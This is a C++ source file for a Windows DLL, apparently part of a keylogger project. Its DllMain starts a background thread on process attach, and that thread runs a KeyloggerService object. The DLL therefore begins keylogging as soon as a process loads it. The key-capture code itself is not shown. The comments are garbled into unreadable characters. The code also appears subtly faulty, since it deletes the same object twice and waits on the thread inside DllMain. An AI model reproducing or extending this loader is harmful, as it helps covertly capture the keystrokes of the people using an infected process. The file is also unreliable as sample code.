#include <Windows.h>
#include "KeyloggerService.h"

// ���������� ���������� ��� ��������� �������
HANDLE hEvent;
KeyloggerService* myApp;

DWORD WINAPI myThreadFunc(LPVOID lpParam)
{
    OutputDebugString(TEXT("myThreadFunc is running\n"));
    const std::vector<std::string> args;
    myApp = new KeyloggerService();
    // �������������� ����������
    try
    {
        // �������������� ����������
        //myApp.initialize();

        // ��������� ����������
        //myApp.initialize();
        myApp->main();
        myApp->uninitialize();
        
        // ������� �������
        //myApp.uninitialize();
    }
    catch (std::exception e)
    {
        std::string s = std::string(e.what());
        std::wstring str = std::wstring(s.begin(), s.end());
        OutputDebugString(str.c_str());
    }
    // ������� ������� �� ������������ ��������
    WaitForSingleObject(hEvent, INFINITE);
    if (myApp)delete myApp;
    return 0;
}

HANDLE hThread;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // ������� �������
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

        // ������� �����, ������� ����� ��������� ����������� �������
        hThread = CreateThread(NULL, 0, myThreadFunc, NULL, 0, NULL);
        
        // ��������� ���������� �������� ������
        if (hThread == NULL)
        {
            // ��������� ������
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // ������������� ������, ��� ����� ��������� ������
        SetEvent(hEvent);
        
        // ���� ���������� ������
        WaitForSingleObject(hThread, INFINITE);
        if (myApp)delete myApp;
        // ��������� ���������� ������� � ������
        CloseHandle(hEvent);
        CloseHandle(hThread);

        break;
    }
    return TRUE;
}